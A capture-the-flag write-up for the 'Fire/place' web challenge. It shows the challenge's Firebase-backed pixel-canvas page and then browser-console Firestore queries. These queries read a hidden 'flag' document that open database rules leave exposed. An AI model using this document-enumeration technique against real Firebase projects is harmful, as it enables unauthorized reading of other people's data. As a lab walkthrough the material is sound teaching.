# Houseplant CTF 2020 – Fire/place

* **Category:** web
* **Points:** 1783

## Challenge

> You see, I built a nice fire/place for us to all huddle around. It's completely decentralized, and we can all share stuff in it for fun!!
> 
> Dev: Jess
>
> Hint! I wonder... what's inside the HTML page?
>
> fire-place[0].html e4a4c2321d18246d027184605ca52866

## Solution

The challenge gives you an [HTML file](fire-place[0].html) which connects to a Firestore environment.

```html
<body>
    <div class="column" style="float: left; width:1000;">
        <canvas id="myCanvas" style="width: 1000px; height: 650px;"></canvas>
    </div>
    <div class="column" style="float: right; width: 300;">
        <br>
        <h1 style = "font-family:georgia,garamond,serif;font-size:20px;">Welcome to fire/place!</h1>
        <br>
        <script src="https://rawgit.com/EastDesire/jscolor/master/jscolor.js"></script>
        <input class="jscolor" id=colour value="f0f0f0">
        <br><br>
        X:<input class="text" id=xpos value=0>
        <br>
        Y:<input class="text" id=ypos value=0>
        <br><br>
        X offset:  <input class="text" id=xoff value=-1>
        <br>Y offset:  <input class="text" id=yoff value=-8>
    </div>
    <script src="https://www.gstatic.com/firebasejs/7.8.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.8.2/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.8.2/firebase-analytics.js"></script>

    <script>
    var firebaseConfig = {
        apiKey: "AIzaSyABDa1gqWZhFy-3OQ664XplH65TNVXfm6E",
        authDomain: "jade-adventure-274923.firebaseapp.com",
        projectId: "jade-adventure-274923",
        storageBucket: "jade-adventure-274923.appspot.com",
        messagingSenderId: "891770626123",
        appId: "1:891770626123:web:70414772b58fceaa88edce",
        measurementId: "G-GZPE7S1WJ0"
    };
    firebase.initializeApp(firebaseConfig);
    firebase.analytics();
    const db = firebase.firestore()
    </script>
</body>

<script>
    var PIXELARRAY=new Array()

    function hexToRgb(hex) {
        var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
        return result ? {
            r: parseInt(result[1], 16),
            g: parseInt(result[2], 16),
            b: parseInt(result[3], 16)
        } : null;
    }

    function sendTHEPIXEL() {
        var loc = (parseInt(document.getElementById("ypos").value*100))+parseInt(document.getElementById("xpos").value)
        converted=hexToRgb(document.getElementById("colour").value)
        finstring="rgb("+converted.r+","+converted.g+","+converted.b+")"
        PIXELARRAY[loc]=finstring
        var docdata= {
            dat:PIXELARRAY
        };
        db.collection("board").doc("data").update(docdata)
    }

    function findScreenCoords(mouseEvent)  {
        var xpos;
        var ypos;
        if (mouseEvent) {
            //FireFox
            xpos = mouseEvent.screenX;
            ypos = mouseEvent.screenY;
        } else {
            //IE
            xpos = window.event.screenX;
            ypos = window.event.screenY;
        }
        if (Math.floor(xpos/10) >= 101) and ((Math.floor(ypos/10)-7) <= 66); {
            document.getElementById("xpos").value=(Math.floor(xpos/10)+parseInt(document.getElementById("xoff").value))
            document.getElementById("ypos").value=(Math.floor(ypos/10)+parseInt(document.getElementById("yoff").value))
            sendTHEPIXEL()
        }
    }

    function drawCanvas(pixelData){
        var c = document.getElementById("myCanvas");
        c.width = 1000;
        c.height = 650;
        var ctx = c.getContext("2d");
        
        x=0
        y=0
        for (var i=0; i<6500; i++) {
            ctx.fillStyle = pixelData[i];
            ctx.fillRect(x*10, y*10, 10, 10);
            x++
            if (x==100) {
                x=0
                y++
            }
        }        
    }
</script>
<script>
    document.addEventListener("click", findScreenCoords);
    db.collection("board").doc("data")
    .onSnapshot(function(doc) {
        drawCanvas(doc.data().dat);
        PIXELARRAY=doc.data().dat;
    });
</script>
```

The application allows you to color pixels on a canvas shared with other users, storing data into Firestore repository.

To interact with Firebase installation you can use the browser console.

Analyzing the client source code and reading the [official documentation](https://firebase.google.com/docs/firestore/query-data/get-data), you can discover that data of a document can be retrieved with the following snippet.

```javascript
db.collection("board").doc("data").get().then(function(doc) {
    if (doc.exists) {
        console.log("Document data:", doc.data());
    } else {
        console.log("No such document!");
    }
}).catch(function(error) {
    console.log("Error getting document:", error);
});
```

The retrieved data will be a structure with all the RGB values for pixels.

```javascript
Document data: Object { dat: (3929) […] }
```

You can try a document called `flag`.

```javascript
db.collection("board").doc("flag").get().then(function(doc) {
    if (doc.exists) {
        console.log("Document data:", doc.data());
    } else {
        console.log("No such document!");
    }
}).catch(function(error) {
    console.log("Error getting document:", error);
});
```

And you will get [the lyrics of a famous song](https://www.youtube.com/watch?v=dQw4w9WgXcQ) and the flag.

```javascript
Document data: 
Object { "Never gonna give you up": "We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you  We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it  And if you ask me how I'm feeling Don't tell me you're too blind to see  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you ​ (Ooh give you up) (Ooh give you up) (Ooh) Never gonna give, never gonna give (give you up) (Ooh) Never gonna give, never gonna give (give you up)  We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you", "flag!!!!!!!!!!!!!": "rtcp{d0n't_g1ve_us3rs_db_a((3ss}" }
```

So the flag is the following.

```
rtcp{d0n't_g1ve_us3rs_db_a((3ss}
```